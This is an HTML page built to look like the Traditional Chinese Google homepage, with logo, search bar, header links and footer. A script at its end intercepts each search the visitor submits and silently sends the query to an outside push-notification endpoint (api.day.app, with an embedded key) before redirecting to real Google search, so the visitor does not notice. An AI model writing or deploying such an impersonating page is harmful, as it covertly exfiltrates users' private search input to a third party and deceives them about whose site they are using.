<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        /* --- General Styles --- */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #fff;
            color: #202124;
        }

        a {
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* --- Header --- */
        .header {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 12px 12px;
            font-size: 13px;
        }
        .header-links {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-links a {
            color: #4d5156;
        }
        .app-launcher {
            width: 24px;
            height: 24px;
            fill: #5f6368;
            opacity: 0.8;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
        }
        .app-launcher:hover {
            background-color: #f0f0f0;
        }
        .login-button {
            background-color: #1a73e8;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 4px;
            padding: 9px 23px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none !important;
        }
        .login-button:hover {
            background-color: #2b7de9;
            box-shadow: 0 1px 3px 1px rgba(0,0,0,.15);
        }

        /* --- Main Content --- */
        .container {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-bottom: 20vh;
        }
        .logo {
            width: 272px;
            height: 92px;
            margin-bottom: 28px;
        }
        .search-container {
            position: relative;
            width: 90%;
            max-width: 584px;
        }
        .search-bar {
            width: 100%;
            padding: 10px 100px 10px 45px;
            height: 46px;
            border-radius: 24px;
            border: 1px solid #dfe1e5;
            box-shadow: none;
            font-size: 16px;
            box-sizing: border-box;
        }
        .search-bar:hover, .search-bar:focus {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
            border-color: rgba(223,225,229,0);
            outline: none;
        }
        .search-icon-left {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            fill: #9aa0a6;
        }
        .search-icons-right {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .mic-icon, .lens-icon {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        /* --- Footer --- */
        .footer {
            background-color: #f2f2f2;
            border-top: 1px solid #e4e4e4;
            color: #70757a;
            font-size: 14px;
            line-height: 40px;
        }
        .footer a {
            color: #70757a;
        }
        .footer-content {
            padding: 0 20px;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap; /* Allow links to wrap on small screens */
            justify-content: center;
            gap: 25px;
        }

        /* --- Responsive Design for Web/Desktop --- */
        @media (min-width: 600px) {
            .header {
                padding: 12px 30px;
            }
            .footer-content {
                display: flex;
                justify-content: space-between;
                padding: 0 30px;
            }
            .footer-links {
                justify-content: flex-start; /* Align links to the start/end on desktop */
            }
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="header-links">
            <a href="https://about.google/">關於 Google</a>
            <a href="https://store.google.com/">Store</a>
        </div>
        <div class="header-links" style="margin-left: auto; padding-left: 30px;">
            <a href="https://mail.google.com/">Gmail</a>
            <a href="https://www.google.com/imghp">圖片</a>
            <svg class="app-launcher" focusable="false" viewBox="0 0 24 24">
                <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
            </svg>
            <a href="https://accounts.google.com/ServiceLogin" class="login-button">登入</a>
        </div>
    </header>

    <main class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        
        <div class="search-container">
            <form id="search-form" action="https://www.google.com/search" method="get">
                <svg class="search-icon-left" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
                </svg>
                <input type="text" class="search-bar" name="q" id="search-input" title="搜尋" autofocus>
                <div class="search-icons-right">
                    <img class="mic-icon" src="https://www.gstatic.com/images/branding/googlemic/2x/googlemic_color_24dp.png" alt="語音搜尋">
                    <img class="lens-icon" src="https://www.gstatic.com/images/branding/searchux/lens_icon/lens_icon.svg" alt="以圖搜尋">
                </div>
            </form>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-content">
             <div class="footer-links" id="footer-left">
                <a href="#">廣告</a>
                <a href="#">商業</a>
                <a href="#">搜尋服務的運作方式</a>
            </div>
            <div class="footer-links" id="footer-right">
                <a href="#">隱私權</a>
                <a href="#">服務條款</a>
                <a href="#">設定</a>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('search-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const query = document.getElementById('search-input').value;
            if (query.trim() !== '') {
                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(barkUrl);
                } else {
                    fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
                }
                setTimeout(() => {
                    window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
                }, 100);
            }
        });
    </script>
</body>
</html>
